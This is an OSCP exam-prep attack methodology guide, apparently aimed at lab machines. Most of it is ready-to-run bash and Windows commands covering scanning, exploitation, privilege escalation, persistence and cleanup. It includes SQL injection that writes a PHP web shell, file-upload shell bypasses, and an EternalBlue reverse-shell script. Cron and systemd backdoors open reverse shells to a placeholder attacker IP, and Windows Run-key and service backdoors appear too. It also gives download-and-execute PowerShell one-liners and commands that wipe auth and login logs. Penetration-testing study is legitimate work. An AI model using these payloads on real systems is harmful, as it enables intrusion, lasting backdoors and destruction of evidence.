# OSCP Complete Attack Methodology - TJ Null Master Edition

Based on comprehensive research from GitHub, OffSec, YouTube, CSDN, Medium, and Reddit across Chinese, English, Hindi, Spanish, and French sources. This is the ultimate systematic approach for tackling TJ Null boxes and OSCP exam scenarios.

## Table of Contents
- [OSCP Attack Methodology Framework](#oscp-attack-methodology-framework)
- [Phase 1: Information Gathering](#phase-1-information-gathering)
- [Phase 2: Vulnerability Assessment](#phase-2-vulnerability-assessment)
- [Phase 3: Exploitation](#phase-3-exploitation)
- [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
- [Phase 5: Privilege Escalation](#phase-5-privilege-escalation)
- [Phase 6: Persistence and Cleanup](#phase-6-persistence-and-cleanup)
- [TJ Null Methodology Patterns](#tj-null-methodology-patterns)
- [Common Failure Points and Solutions](#common-failure-points-and-solutions)

## OSCP Attack Methodology Framework

### The OSCP Systematic Approach

**Core Principles:**
1. **Systematic over Speed** - Follow methodology religiously
2. **Document Everything** - Screenshots, commands, findings
3. **Never Skip Steps** - Each phase builds on the previous
4. **Multiple Attack Vectors** - Always have backup plans
5. **Time Management** - Know when to pivot or move on

**Attack Chain Overview:**
```
Information Gathering → Vulnerability Assessment → Exploitation → Post-Exploitation → Privilege Escalation → Persistence
```

### Time Allocation Strategy

**Recommended Time Distribution:**
- **40% Information Gathering** - Foundation of all attacks
- **20% Vulnerability Assessment** - Identify attack vectors
- **25% Exploitation** - Gain initial access
- **10% Post-Exploitation** - Understand environment
- **5% Privilege Escalation** - Achieve administrative access

**OSCP Exam Time Management:**
- **Maximum 4 hours per standalone machine**
- **Maximum 6 hours for complete AD set**
- **Mandatory breaks every 2 hours**
- **Documentation throughout, not at the end**

## Phase 1: Information Gathering

### Step 1: Network Discovery and Port Scanning

**Initial Network Reconnaissance (15 minutes)**
```bash
# Set target - EDIT THIS LINE ONLY
TARGET=192.168.1.100

# Host discovery
ping -c 1 $TARGET
nmap -sn $TARGET

# Quick port scan (top 1000 ports)
nmap -sS --top-ports 1000 $TARGET -T4 --min-rate=1000 -oN quick_scan.txt

# Extract open ports for detailed scanning
open_ports=$(grep "^[0-9]" quick_scan.txt | grep "open" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
echo "Open ports: $open_ports"
```

**Comprehensive Port Analysis (30 minutes)**
```bash
# Detailed service enumeration on open ports
if [ ! -z "$open_ports" ]; then
    nmap -sS -sV -sC -A -p $open_ports $TARGET -oN detailed_scan.txt
fi

# Full TCP port range (background process)
nmap -sS -p- $TARGET -T4 --min-rate=1000 -oN full_tcp_scan.txt &

# UDP scan on common ports
sudo nmap -sU --top-ports 100 $TARGET -T4 -oN udp_scan.txt &

# Wait for detailed scan to complete
wait %1
```

### Step 2: Service-Specific Enumeration

**Web Services (Ports 80, 443, 8080, etc.)**
```bash
# Technology identification
whatweb http://$TARGET -v
wafw00f http://$TARGET

# Directory and file enumeration
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,xml,bak,backup -t 50 -o web_dirs.txt

# Common files check
files=("robots.txt" "sitemap.xml" "admin.php" "login.php" "config.php" "backup.sql" ".env" "web.config" ".htaccess")
for file in "${files[@]}"; do
    response=$(curl -s -w "%{http_code}" -o /dev/null http://$TARGET/$file)
    if [ "$response" = "200" ]; then
        echo "FOUND: http://$TARGET/$file"
        curl -s http://$TARGET/$file > found_$file
    fi
done

# Vulnerability scanning
nikto -h http://$TARGET -o web_vulns.txt
```

**SMB Services (Ports 139, 445)**
```bash
# SMB enumeration
enum4linux -a $TARGET > smb_enum.txt
smbmap -H $TARGET > smb_shares.txt
smbclient -L //$TARGET -N > smb_list.txt

# SMB vulnerability scanning
nmap -p 445 --script smb-vuln-* $TARGET > smb_vulns.txt

# Anonymous access testing
smbclient //$TARGET/IPC$ -N -c "ls"
```

**SSH Service (Port 22)**
```bash
# SSH enumeration
ssh-audit $TARGET
nmap -p 22 --script ssh-* $TARGET

# SSH banner
nc -nv $TARGET 22
```

**FTP Service (Port 21)**
```bash
# FTP enumeration
nmap -p 21 --script ftp-* $TARGET

# Anonymous access testing
ftp $TARGET
# Try: anonymous/anonymous, ftp/ftp
```

### Step 3: Information Consolidation

**Document Findings (15 minutes)**
```bash
# Create structured notes
cat > target_summary.txt << EOF
Target: $TARGET
Date: $(date)

=== OPEN PORTS ===
$(cat quick_scan.txt | grep "open")

=== SERVICES IDENTIFIED ===
$(cat detailed_scan.txt | grep -A5 "PORT.*STATE.*SERVICE")

=== WEB SERVICES ===
$(if [ -f web_dirs.txt ]; then echo "Directories found:"; cat web_dirs.txt | grep "Status: 200"; fi)

=== SMB SERVICES ===  
$(if [ -f smb_shares.txt ]; then echo "SMB shares:"; cat smb_shares.txt; fi)

=== NOTES ===
- Next steps:
- Potential vulnerabilities:
- Attack vectors identified:
EOF
```

## Phase 2: Vulnerability Assessment

### Step 1: Automated Vulnerability Scanning

**Network-Level Vulnerability Assessment**
```bash
# General vulnerability scan
nmap --script vuln $TARGET -oN vuln_scan.txt

# Service-specific vulnerability scans
if grep -q "80\|443" quick_scan.txt; then
    nmap -p 80,443 --script http-vuln-* $TARGET >> vuln_scan.txt
fi

if grep -q "445" quick_scan.txt; then
    nmap -p 445 --script smb-vuln-* $TARGET >> vuln_scan.txt
fi

if grep -q "22" quick_scan.txt; then
    nmap -p 22 --script ssh2-enum-algos,ssh-hostkey $TARGET >> vuln_scan.txt
fi
```

**Web Application Vulnerability Assessment**
```bash
# Automated web vulnerability scanning
if command -v nikto &> /dev/null; then
    nikto -h http://$TARGET -output web_auto_vulns.txt
fi

# Manual web testing checklist
echo "Manual web testing checklist:" > web_manual_tests.txt
echo "[ ] SQL injection in all parameters" >> web_manual_tests.txt
echo "[ ] XSS in input fields" >> web_manual_tests.txt  
echo "[ ] File upload functionality" >> web_manual_tests.txt
echo "[ ] Directory traversal" >> web_manual_tests.txt
echo "[ ] Command injection" >> web_manual_tests.txt
echo "[ ] Authentication bypass" >> web_manual_tests.txt
```

### Step 2: Manual Vulnerability Verification

**SQL Injection Testing**
```bash
# Basic SQL injection tests
if [ -f web_dirs.txt ]; then
    # Find pages with parameters
    grep -i "php\|asp\|jsp" web_dirs.txt | head -5 | while read page; do
        echo "Testing SQL injection on: $page"
        
        # Basic injection tests
        curl -s "http://$TARGET$page?id=1'" | grep -i "error\|mysql\|oracle\|postgresql"
        curl -s "http://$TARGET$page?id=1 AND 1=1--" | wc -c
        curl -s "http://$TARGET$page?id=1 AND 1=2--" | wc -c
    done
fi
```

**Authentication Testing**
```bash
# Common credential testing
if grep -q "login\|admin" web_dirs.txt; then
    echo "Testing common credentials on login pages..."
    
    # Common credential pairs
    creds=("admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "guest:guest")
    
    for cred in "${creds[@]}"; do
        user=$(echo $cred | cut -d':' -f1)
        pass=$(echo $cred | cut -d':' -f2)
        echo "Trying: $user:$pass"
        
        # Test via curl (adapt URL as needed)
        curl -s -d "username=$user&password=$pass" http://$TARGET/login.php | grep -i "welcome\|dashboard\|admin"
    done
fi
```

## Phase 3: Exploitation

### Step 1: Exploit Prioritization

**Vulnerability Ranking System:**
1. **Critical (Immediate exploitation):** Remote code execution, SQL injection with file write
2. **High (Primary targets):** Authentication bypass, file upload vulnerabilities  
3. **Medium (Secondary):** Local file inclusion, privilege escalation vectors
4. **Low (Last resort):** Information disclosure, client-side attacks

**Exploit Selection Process:**
```bash
# Create exploit priority list
cat > exploit_priority.txt << EOF
=== CRITICAL VULNERABILITIES ===
$(grep -i "rce\|remote.*exec\|code.*exec" vuln_scan.txt)

=== HIGH PRIORITY ===
$(grep -i "auth.*bypass\|upload" vuln_scan.txt)

=== MEDIUM PRIORITY === 
$(grep -i "lfi\|rfi\|inclusion" vuln_scan.txt)

=== LOW PRIORITY ===
$(grep -i "disclosure\|xss" vuln_scan.txt)
EOF
```

### Step 2: Web Application Exploitation

**SQL Injection Exploitation**
```bash
# Manual SQL injection exploitation
sqlinjection_exploit() {
    local url=$1
    local param=$2
    
    echo "[+] Testing SQL injection on $url with parameter $param"
    
    # Test for error-based injection
    error_test=$(curl -s "$url?$param=1'" | grep -i "error\|mysql\|warning")
    if [ ! -z "$error_test" ]; then
        echo "[+] Error-based SQL injection found!"
        
        # Extract database information
        curl -s "$url?$param=1' UNION SELECT 1,@@version,3--" | grep -o "5\.[0-9]\.[0-9]"
        curl -s "$url?$param=1' UNION SELECT 1,database(),3--" 
        curl -s "$url?$param=1' UNION SELECT 1,user(),3--"
        
        # Extract table information
        curl -s "$url?$param=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
        
        # Try to write web shell
        curl -s "$url?$param=1' UNION SELECT 1,'<?php system(\$_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--"
        
        # Test web shell
        shell_test=$(curl -s "http://$TARGET/shell.php?cmd=whoami")
        if [ ! -z "$shell_test" ]; then
            echo "[+] Web shell successfully written!"
            echo "URL: http://$TARGET/shell.php?cmd=COMMAND"
        fi
    fi
}

# Test identified parameters
# sqlinjection_exploit "http://$TARGET/page.php" "id"
```

**File Upload Exploitation**
```bash
# File upload exploitation
file_upload_exploit() {
    local upload_url=$1
    
    echo "[+] Testing file upload at $upload_url"
    
    # Create PHP web shell
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    
    # Try direct upload
    curl -F "file=@shell.php" $upload_url
    
    # Try with image content-type
    curl -F "file=@shell.php;type=image/jpeg" $upload_url
    
    # Try double extension
    mv shell.php shell.php.jpg
    curl -F "file=@shell.php.jpg" $upload_url
    
    # Try with magic bytes
    echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell_magic.php
    curl -F "file=@shell_magic.php" $upload_url
    
    # Test uploaded shell
    curl -s "http://$TARGET/uploads/shell.php?cmd=whoami"
}
```

### Step 3: Service Exploitation

**SMB Exploitation (EternalBlue)**
```bash
# EternalBlue exploitation
eternalblue_exploit() {
    echo "[+] Testing for MS17-010 EternalBlue vulnerability"
    
    # Vulnerability verification
    vuln_check=$(nmap -p 445 --script smb-vuln-ms17-010 $TARGET | grep "VULNERABLE")
    
    if [ ! -z "$vuln_check" ]; then
        echo "[+] Target appears vulnerable to EternalBlue!"
        
        # Manual exploitation using searchsploit
        searchsploit ms17-010
        
        # Copy exploit
        cp /usr/share/exploitdb/exploits/windows/remote/42315.py .
        
        # Prepare payload (modify script as needed)
        echo "[+] Prepare payload and run: python3 42315.py $TARGET"
        
        # Alternative: Metasploit
        cat > eternalblue_msf.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set payload windows/x64/shell_reverse_tcp
set LHOST $(ip route get 1 | awk '{print $7; exit}')
set LPORT 4444
run
EOF
        echo "[+] Metasploit resource script created: eternalblue_msf.rc"
    fi
}

eternalblue_exploit
```

**SSH Exploitation**
```bash
# SSH brute force (last resort)
ssh_bruteforce() {
    echo "[+] SSH brute force attack"
    
    # Create user list
    echo -e "root\nadmin\nuser\ntest\nubuntu\ndebian" > users.txt
    
    # Create password list
    echo -e "password\nadmin\n123456\npassword123\nroot\ntoor" > passwords.txt
    
    # Hydra brute force (use sparingly)
    hydra -L users.txt -P passwords.txt -t 4 -f ssh://$TARGET
}
```

## Phase 4: Post-Exploitation

### Step 1: Initial Access Verification

**Establish Stable Shell**
```bash
# Upgrade shell (Linux)
upgrade_shell() {
    echo "[+] Upgrading shell"
    
    # Python TTY
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    
    # Background shell, configure terminal
    # Ctrl+Z
    stty raw -echo; fg
    
    # Set terminal size
    stty rows 38 columns 116
}

# Establish persistence
establish_persistence() {
    echo "[+] Establishing persistence"
    
    # SSH key method
    mkdir -p ~/.ssh
    echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
    chmod 700 ~/.ssh
    chmod 600 ~/.ssh/authorized_keys
    
    # Crontab method  
    (crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -
}
```

### Step 2: System Information Gathering

**Linux System Enumeration**
```bash
# System information collection
system_enum() {
    echo "[+] Gathering system information"
    
    # Basic system info
    uname -a
    cat /etc/*release*
    hostname
    
    # Current user context
    id
    whoami
    groups
    
    # Network information
    ifconfig -a || ip addr show
    netstat -antup || ss -antup
    
    # Process information
    ps aux
    
    # Installed software
    dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
    
    # Services
    systemctl list-units --type=service 2>/dev/null || service --status-all 2>/dev/null
}

system_enum > system_info.txt
```

**Windows System Enumeration**
```cmd
REM Windows system enumeration
systeminfo
whoami /all
net user
net localgroup
net localgroup administrators
tasklist
sc query
wmic product get name,version
```

### Step 3: Network and Domain Reconnaissance

**Network Mapping**
```bash
# Internal network discovery
network_discovery() {
    echo "[+] Internal network discovery"
    
    # ARP table
    arp -a
    
    # Network interfaces
    ifconfig -a || ip addr show
    
    # Routing table  
    route -n || ip route show
    
    # DNS configuration
    cat /etc/resolv.conf
    
    # Ping sweep internal networks
    for subnet in 192.168.1 192.168.0 10.0.0 172.16.0; do
        for i in {1..254}; do
            ping -c 1 -W 1 $subnet.$i &>/dev/null && echo "$subnet.$i is alive"
        done &
    done
    wait
}

network_discovery > network_info.txt
```

## Phase 5: Privilege Escalation

### Step 1: Linux Privilege Escalation

**Automated Enumeration**
```bash
# Download and run LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > linpeas_output.txt

# Alternative: LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh > linenum_output.txt
```

**Manual Privilege Escalation Checks**
```bash
# Manual privilege escalation enumeration
manual_privesc() {
    echo "[+] Manual privilege escalation enumeration"
    
    # Sudo rights
    sudo -l
    
    # SUID binaries
    find / -perm -4000 2>/dev/null
    
    # SGID binaries
    find / -perm -2000 2>/dev/null
    
    # Writable directories
    find / -type d -writable 2>/dev/null
    
    # World-writable files
    find / -type f -writable 2>/dev/null
    
    # Capabilities
    getcap -r / 2>/dev/null
    
    # Cron jobs
    cat /etc/crontab
    ls -la /etc/cron*
    crontab -l
    
    # Password files
    find / -name "*.password" 2>/dev/null
    find / -name "*password*" 2>/dev/null
    grep -r "password" /var/log/ 2>/dev/null
    
    # SSH keys
    find / -name "id_rsa*" 2>/dev/null
    find / -name "id_dsa*" 2>/dev/null
    find / -name "authorized_keys" 2>/dev/null
    
    # History files
    find / -name "*_history" 2>/dev/null
    
    # Configuration files
    find /etc -readable -type f 2>/dev/null | head -20
}

manual_privesc > manual_privesc.txt
```

**Common Linux Privilege Escalation Techniques**
```bash
# Sudo exploitation
sudo_exploit() {
    # Check sudo version
    sudo -V
    
    # Check for specific sudo vulnerabilities
    # CVE-2021-4034 (PwnKit)
    # CVE-2021-3156 (Baron Samedit)
    
    # Exploit sudo misconfigurations
    # Example: sudo nano (escape to shell)
    # sudo nano
    # Ctrl+R, Ctrl+X, reset; sh 1>&0 2>&0
}

# SUID binary exploitation
suid_exploit() {
    # Common SUID binaries to check
    binaries=("find" "vim" "nano" "nmap" "awk" "python" "perl" "ruby" "cp" "mv")
    
    for binary in "${binaries[@]}"; do
        if find / -name "$binary" -perm -4000 2>/dev/null; then
            echo "[+] SUID $binary found - check GTFOBins"
            # GTFOBins reference: https://gtfobins.github.io/
        fi
    done
}
```

### Step 2: Windows Privilege Escalation

**Automated Windows Enumeration**
```powershell
# PowerShell enumeration script
powershell -ep bypass
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Alternative: WinPEAS
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
```

**Manual Windows Privilege Escalation**
```cmd
REM Manual Windows privilege escalation checks
REM Current privileges
whoami /priv

REM Vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
sc query

REM Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """

REM AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

REM Stored credentials
cmdkey /list
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b

REM Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

REM Scheduled tasks
schtasks /query /fo LIST /v
```

## Phase 6: Persistence and Cleanup

### Step 1: Establishing Persistence

**Linux Persistence Methods**
```bash
# SSH key persistence
persistence_ssh() {
    mkdir -p ~/.ssh
    echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
    chmod 700 ~/.ssh
    chmod 600 ~/.ssh/authorized_keys
}

# Crontab persistence
persistence_cron() {
    (crontab -l ; echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -
}

# Service persistence
persistence_service() {
    cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Monitoring Service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl enable backdoor.service
    systemctl start backdoor.service
}
```

**Windows Persistence Methods**
```cmd
REM Registry persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d "C:\backdoor.exe"

REM Scheduled task persistence
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc onlogon

REM Service persistence
sc create Backdoor binpath= "C:\backdoor.exe" start= auto
sc start Backdoor
```

### Step 2: Data Exfiltration and Evidence Collection

**Evidence Collection**
```bash
# Collect flags and evidence
evidence_collection() {
    echo "[+] Collecting evidence and flags"
    
    # Find flags
    find / -name "user.txt" 2>/dev/null
    find / -name "root.txt" 2>/dev/null
    find / -name "local.txt" 2>/dev/null
    find / -name "proof.txt" 2>/dev/null
    
    # System information for report
    hostname > evidence/hostname.txt
    whoami > evidence/whoami.txt
    id > evidence/id.txt
    uname -a > evidence/uname.txt
    
    # Screenshot equivalent (command output)
    ps aux > evidence/processes.txt
    netstat -antup > evidence/netstat.txt
}

mkdir -p evidence
evidence_collection
```

### Step 3: Cleanup and Covering Tracks

**Log Cleanup (Educational Purpose Only)**
```bash
# Clear command history (use responsibly)
cleanup_logs() {
    # Clear bash history
    history -c
    cat /dev/null > ~/.bash_history
    
    # Clear auth logs (if writable)
    cat /dev/null > /var/log/auth.log
    cat /dev/null > /var/log/wtmp
    cat /dev/null > /var/log/lastlog
    
    # Remove uploaded files
    rm -f shell.php linpeas.sh linenum.sh
}
```

## TJ Null Methodology Patterns

### Pattern 1: Web Application Chain
```
1. Port scan reveals web service (80/443)
2. Directory enumeration finds admin panel
3. Default credentials or SQL injection bypass
4. Admin panel has file upload functionality
5. Upload PHP web shell with extension bypass
6. Web shell provides initial access
7. LinPEAS reveals sudo misconfiguration
8. Sudo exploitation grants root access
```

### Pattern 2: Service Exploitation Chain
```
1. Port scan reveals SMB service (445)
2. Vulnerability scan identifies EternalBlue
3. EternalBlue exploit grants SYSTEM access
4. No privilege escalation needed
5. Extract credentials from SAM database
6. Credentials work on other network hosts
```

### Pattern 3: Information Disclosure Chain
```
1. FTP anonymous access reveals configuration files
2. Configuration files contain database credentials
3. Database contains user password hashes
4. Hashcat cracks weak passwords
5. SSH access with cracked credentials
6. User has sudo rights for specific binary
7. GTFOBins technique escalates to root
```

## Common Failure Points and Solutions

### Failure Point 1: Insufficient Enumeration

**Problem:** Missing critical services or information
**Solution:**
- Always run full TCP port scan in background
- Check UDP ports for common services
- Use multiple enumeration tools
- Don't rely solely on automated tools

### Failure Point 2: Tunnel Vision on Single Attack Vector

**Problem:** Stuck on one approach for too long
**Solution:**
- Set strict time limits (2 hours max per machine)
- Maintain list of alternative attack vectors
- Take breaks to reset perspective
- Document findings for later review

### Failure Point 3: Poor Documentation

**Problem:** Cannot reproduce successful attacks
**Solution:**
- Screenshot every important step
- Document exact commands used
- Save all tool output to files
- Maintain detailed notes throughout

### Failure Point 4: Skipping Manual Testing

**Problem:** Over-reliance on automated tools
**Solution:**
- Manually verify automated results
- Test edge cases tools might miss
- Use tools as starting point, not final answer
- Combine multiple tool outputs

### Systematic Checklist for Each Machine

**Phase 1 Checklist:**
- [ ] Host discovery and port scan completed
- [ ] All open services enumerated
- [ ] Web directories and files discovered
- [ ] Technology stack identified
- [ ] Potential attack vectors documented

**Phase 2 Checklist:**
- [ ] Vulnerability scan completed
- [ ] Manual testing performed
- [ ] Exploits identified and prioritized
- [ ] Attack plan documented

**Phase 3 Checklist:**
- [ ] Initial exploit attempted
- [ ] Alternative methods tested if needed
- [ ] Shell access achieved
- [ ] Access documented with screenshots

**Phase 4 Checklist:**
- [ ] Shell upgraded and stabilized
- [ ] System information gathered
- [ ] Network reconnaissance completed
- [ ] Privilege escalation vectors identified

**Phase 5 Checklist:**
- [ ] Privilege escalation successful
- [ ] Administrative access achieved
- [ ] Flags located and documented
- [ ] Evidence collected

**Remember:** This methodology is your roadmap to success. Follow it systematically, adapt it to specific scenarios, and practice until it becomes second nature. The OSCP exam tests your ability to follow a professional penetration testing process under pressure.